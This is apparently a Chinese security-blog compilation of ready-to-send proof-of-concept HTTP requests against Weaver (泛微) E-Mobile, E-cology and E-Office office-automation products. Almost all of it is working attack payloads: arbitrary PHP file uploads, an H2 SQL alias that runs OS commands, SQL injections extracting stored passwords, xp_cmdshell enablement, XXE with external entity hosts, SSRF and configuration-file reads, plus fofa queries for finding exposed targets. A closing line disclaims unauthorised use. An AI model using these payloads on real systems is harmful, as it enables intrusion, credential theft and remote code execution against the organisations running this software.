#  【泛微】漏洞利用PoC整理   
原创 F1rstb100d  智佳网络安全   2024-07-27 14:45  
  
## unsetunset泛微E-Mobile系列unsetunset  
### E-mobile lang2sql接口任意文件上传漏洞  
  
title="移动管理平台-企业管理"  
```
POST /emp/lang2sql?client_type=1&lang_tag=1 HTTP/1.1
Content-Type: multipart/form-data;boundary=----WebKitFormBoundarymVk33liI64J7GQaK
Content-Length: 226
 
------WebKitFormBoundarymVk33liI64J7GQaK
Content-Disposition: form-data; name="file";filename="../../../../appsvr/tomcat/webapps/ROOT/Check.txt"
 
This site has a vulnerability !!!
------WebKitFormBoundarymVk33liI64J7GQaK--

```  
  
访问{host}/Check.txt即可  
### e-mobile_upload_save 任意文件上传漏洞  
  
body="/newplugins/js/pnotify/jquery.pnotify.default.css"  
```
POST /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save  HTTP/1.1   
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt  
Content-Length: 350  
  
------WebKitFormBoundarydRVCGWq4Cx3Sq6tt  
Content-Disposition: form-data; name="upload_quwan"; filename="1.php."  
Content-Type: image/jpeg  
  
<?php phpinfo();?>  
------WebKitFormBoundarydRVCGWq4Cx3Sq6tt

```  
  
访问回显中的/attachment/xxxxxx/1.php即可  
### E-Mobile 6.0 命令执行漏洞  
  
fofa：app="泛微-EMobile"  
```
POST /client.do HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvVPZWWKFq310ISXS
Content-Length: 1125

------WebKitFormBoundaryvVPZWWKFq310ISXS
Content-Disposition: form-data; name="method"

getupload
------WebKitFormBoundaryvVPZWWKFq310ISXS
Content-Disposition: form-data; name="uploadID"

1';CREATE ALIAS if not exists abcd AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass("com.caucho.server.dispatch.ServletInvocation").getMet','hod("getContextRequest").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField("_response");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod("getWriter");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter("\\A");writer.write(scan','ner.hasNext()?sca','nner.next():"");}');CALL abcd('whoami');--------WebKitFormBoundaryvVPZWWKFq310ISXS--
```  
## unsetunset泛微E-cology系列unsetunset  
### e-cology getFileViewUrl接口存在SSRF漏洞  
```
POST /api/doc/mobile/fileview/getFileViewUrl HTTP/1.1
Content-Type: application/json
Content-Length: 110

{
    "file_id": "1000",
    "file_name": "c",
    "download_url":"http://xxxx.dnslog.cn"
}

```  
### !e-cology WorkflowServiceXml SQL注入漏洞  
  
app="泛微-OA（e-cology）"  
```
POST /services%20/WorkflowServiceXml HTTP/1.1
Content-Length: 422
Content-Type: text/xml
 
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservices.workflow.weaver">
<soapenv:Header/>
<soapenv:Body>
<web:getHendledWorkflowRequestList>
<web:in0>1</web:in0>
<web:in1>1</web:in1>
<web:in2>1</web:in2>
<web:in3>1</web:in3>
<web:in4>
<web:string>1=1 AND 2=2</web:string>
</web:in4>
</web:getHendledWorkflowRequestList>
</soapenv:Body>
</soapenv:Envelope>
返回包有requestName和workflowTypeName即可

```  
### e-cology getE9DevelopAllNameValue2任意文件读取漏洞  
```
GET /api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_%2f%2e%2e%2fweaver%2eproperties HTTP/1.1

```  
### e-Weaver SQL注入  
```
GET /Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@version HTTP/1.1

```  
### e-cology前台接口SQL注入漏洞  
```
POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333 HTTP/1.1
 
formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1

```  
### E-Cology9 browser.jsp SQL注入漏洞(CNVD-2023-12632)  
```
 
POST /mobile/%20/plugin/browser.jsp HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 2437
 
isDis=1&browserTypeId=269&keyword=%25%32%35%25%33%36%25%33%31%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%35%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%36%33%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%36%32%25%32%35%25%33%32%25%33%38%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%30%25%32%35%25%33%36%25%33%31%25%32%35%25%33%37%25%33%33%25%32%35%25%33%37%25%33%33%25%32%35%25%33%37%25%33%37%25%32%35%25%33%36%25%36%36%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%36%25%33%36%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%36%25%33%38%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%36%34%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%33%35%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%36%36%25%32%35%25%33%37%25%33%35%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%34%25%32%35%25%33%36%25%33%31%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%31%25%32%35%25%33%36%25%33%37%25%32%35%25%33%36%25%33%35%25%32%35%25%33%37%25%33%32%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%37%25%32%35%25%33%36%25%33%38%25%32%35%25%33%36%25%33%35%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%33%35%25%32%35%25%33%32%25%33%30%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%33%37%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%33%34%25%32%35%25%33%33%25%36%34%25%32%35%25%33%32%25%33%37%25%32%35%25%33%37%25%33%33%25%32%35%25%33%37%25%33%39%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%31%25%32%35%25%33%36%25%33%34%25%32%35%25%33%36%25%36%34%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%35%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%39%25%32%35%25%33%32%25%36%32%25%32%35%25%33%32%25%33%37

```  
### e-cology 前台SQL注入漏洞  
  
app.name="泛微 e-cology 9.0 OA"  
```
POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1      
 
fileid=1+WAITFOR+DELAY+%270:0:2%27&isFromOutImg=1

```  
### E-cology XML外部实体注入漏洞  
```
POST /rest/ofs/deleteUserRequestInfoByXml HTTP/1.1
Content-Type: application/xml

<a><syscode>1</syscode></a>

```  
```
POST /rest/ofs/ReceiveCCRequestByXml HTTP/1.1
Content-Type: application/xml

```  
```
POST /rest/ofs/deleteUserRequestInfoByXml HTTP/1.1
Content-Length: 35
Content-Type: application/xml
 

<?xml version="1.0"?>
<!DOCTYPE ANY [
    <!ENTITY % d SYSTEM "http://wutvavcfzj.dnstunnel.run">
    %d;
]>
<a>&xxe;</a>

```  
### e-cology  ofsLogin任意用户登录漏洞  
```
/mobile/plugin/1/ofsLogin.jsp?gopage=/wui/index.html&loginTokenFromThird=866fb3887a60239fc112354ee7ffc168&receiver=1&syscode=1&timestamp

```  
### e-cology CheckServer.jsp SQL注入  
```
/mobile/plugin/CheckServer.jsp?type=mobileSetting

```  
### !E-Cology WorkPlanService 未授权 SQL注入  
```
POST /services/WorkPlanService

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.workplan.weaver.com.cn"> <soapenv:Header/> <soapenv:Body> <web:deleteWorkPlan> <!--type: string--> <web:in0></web:in0> <!--type: int--> <web:in1>22</web:in1> </web:deleteWorkPlan> </soapenv:Body> </soapenv:Envelope>
//延迟大于2.5

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.workplan.weaver.com.cn"> <soapenv:Header/> <soapenv:Body> <web:deleteWorkPlan> <!--type: string--> <web:in0>(SELECT 8544 FROM (SELECT(SLEEP(3-(IF(27=27,0,5)))))NZeo)</web:in0> <!--type: int--> <web:in1>22</web:in1> </web:deleteWorkPlan> </soapenv:Body> </soapenv:Envelope>
//延迟小于3.5

```  
### ECology ifNewsCheckOutByCurrentUser.dwr 未授权 SQL注入  
```
POST /dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr HTTP/1.1
Content-Length: 189
Content-Type: text/plain

callCount=1
page=
httpSessionId=
scriptSessionId=
c0-scriptName=DocDwrUtil
c0-methodName=ifNewsCheckOutByCurrentUser
c0-id=0
c0-param0=string:1 WAITFOR DELAY '0:0:3'
c0-param1=string:1
batchId=0

```  
### ECology Download.jsp 未授权 路径遍历漏洞  
```
{host} + "/mobile/plugin/Download.jsp?sessionkey=1/mobile/plugin/Download.jsp?sessionkey=1%27%20EXEC%20sp_configure%20%27show%20advanced%20options%27,1%20RECONFIGURE%20EXEC%20sp_configure%20%27xp_cmdshell%27,1%20RECONFIGURE%20exec%20master..xp_cmdshell%20%27ping+{dns_host}"

```  
### E-Cology-KtreeUploadAction任意文件上传漏洞  
```
POST /weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image HTTP/1.1
Content-Length: 160   
Content-Type: multipart/form-data; boundary=--------1638451160  
Cookie: Secure; JSESSIONID=abc6xLBV7S2jvgm3CB50w; Secure; testBanCookie=test  
  
----------1638451160  
Content-Disposition: form-data; name="test"; filename="test.txt"  
Content-Type: application/octet-stream  
  
test  
----------1638451160--

```  
### E-Cology FileDownload文件读取漏洞  
```
GET /weaver/ln.FileDownload?fpath=../ecology/WEB-INF/prop/weaver.properties HTTP/1.1

```  
### E-Cology ResourceServlet文件读取漏洞  
```
GET /weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/prop/weaver.properties HTTP/1.1

```  
### E-Cology ProcessOverRequestByXml文件读取漏洞  
```
POST /rest/ofs/ProcessOverRequestByXml HTTP/1.1
Content-Length: 146
Content-Type: application/xml

<?xml version="1.0" encoding="utf-8" ?><!DOCTYPE test[<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><reset><syscode>&test;</syscode></reset>

```  
### E-Cology Getdata SQL注入漏洞  
```
GET /js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager HTTP/1.1

```  
### E-Cology LoginSSO SQL注入漏洞  
```
GET /upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager HTTP/1.1

```  
### E-Cology SyncUserInfo SQL注入漏洞  
```
GET /mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str(3333*3333),null HTTP/1.1

```  
## unsetunset泛微E-Office系列unsetunset  
### E-Office文件上传漏洞（CVE-2023-2523)  
  
app="泛微-EOffice"  
```
POST/Emobile/App/Ajax/ajax.php?action=mobile_upload_save  HTTP/1.1 
Content-Type:multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt  
Accept-Encoding:gzip, deflate

------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
Content-Disposition:form-data; name="upload_quwan"; filename="1.php."
Content-Type:image/jpeg

<?phpphpinfo();?>
------WebKitFormBoundarydRVCGWq4Cx3Sq6tt
Content-Disposition:form-data; name="file"; filename=""
Content-Type:application/octet-stream
------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--

```  
### E-Office 任意文件下载  
```
/general/file_folder/file_new/neworedit/download.php?filename=hosts&dir=C:\Windows\System32\drivers\etc\

```  
### E-Office信息泄露漏洞(CVE-2023-2766)  
```
GET /building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini HTTP/1.1
GET /building/config/config.ini HTTP/1.1

```  
### E-Office文件上传漏洞(CVE-2023-2648)  
```
POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
Content-Length: 491
Accept-Encoding: gzip
Content-Type: multipart/form-data; boundary=25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
 
--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
Content-Disposition: form-data; name="Filedata"; filename="666.php"
Content-Type: application/octet-stream
 
<?php phpinfo();?>
 
--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--
--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
Content-Disposition: form-data; name="file"; filename=""
Content-Type: application/octet-stream
 
--25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--

```  
  
访问{host}/attachment/返回数字/666.php  
### E-Office UserSelect未授权访问漏洞  
```
GET /UserSelect/ HTTP/1.1
Content-Type: application/josn

```  
### E-Office mysql_config.ini 数据库信息泄漏漏洞  
```
GET /mysql_config.ini HTTP/1.1
Content-Type: application/josn

```  
### !E-office10 leave_record.php 未授权 SQL注入  
```
body="eoffice10"&&body="eoffice_loading_tip"
http://xx.xx.xx.xx/eoffice10/client/web/login  //首页
http://xx.xx.xx.xx/eoffice10/version.json   //版本

```  
```
{host} + /eoffice10/server/ext/system_support/leave_record.php?flow_id=1%27+AND+%28SELECT+4196+FROM+%28SELECT%28SLEEP%2810%29%29%29LWzs%29+AND+%27zfNf%27%3D%27zfNf&run_id=1&table_field=1&table_field_name=user()&max_rows=10

```  
  
延迟10秒即执行成功
sqlmap注入run_id时需要设置--prefix="') " --suffix="%23" -p run_id，注入table_field时直接*即可  
### EOffice XmlRpcServlet 任意文件读取  
```
POST /weaver/org.apache.xmlrpc.webserver.XmlRpcServlet HTTP/1.1
Content-Type: text/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8"?>  
<methodCall>  
<methodName>WorkflowService.getAttachment</methodName>  
<params>  
<param>  
<value><string>c://windows/win.ini</string></value>  
</param>  
</params>  
</methodCall>

<?xml version="1.0" encoding="UTF-8"?>  
<methodCall>  
<methodName>WorkflowService.LoadTemplateProp</methodName>  
<params>  
<param>  
<value><string>weaver</string></value>  
</param>  
</params>  
</methodCall>

```  
### EOffice 未授权 文件包含漏洞  
```
POST /general/charge/charge_list/do_excel.php
html=<?php+echo+md5('123');unlink(__FILE__);?>

GET /general/charge/charge_list/excel.php 验证md5

```  
### EOffice UploadFile.php 未授权 文件上传限制不当  
```
POST /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=
Content-Type: multipart/form-data; boundary=f644df16c554bbc109cecef6451c26a4

--f644df16c554bbc109cecef6451c26a4
Content-Disposition: form-data; name="Filedata"; filename="test.txt"
Content-Type: image/jpeg

srctest20211129
--f644df16c554bbc109cecef6451c26a4--

```  
  
访问{host} + /images/logo/ + response.text，显示srctest20211129即存在  
### e-office sql注入漏洞  
```
POST /building/json_common.php

tfs=city` where cityId=-1 /*!50000union*/ /*!50000select*/1,2,version(),4#|2|333

```  
  
  
  
公众号技术文章仅供诸位网络安全工程师对自己所管辖的网站、服务器、网络进行检测或维护时参考用，公众号的检测工具、脚本仅供各大安全公司的安全测试员安全测试使用。未经允许请勿利用文章里的技术资料对任何外部计算机系统进行入侵攻击，公众号的各类工具、脚本均不得用于任何非授权形式的安全测试。  
  
公众号仅提供技术交流，不对任何成员利用技术文章或者检测工具造成任何理论上的或实际上的损失承担责任。  
  
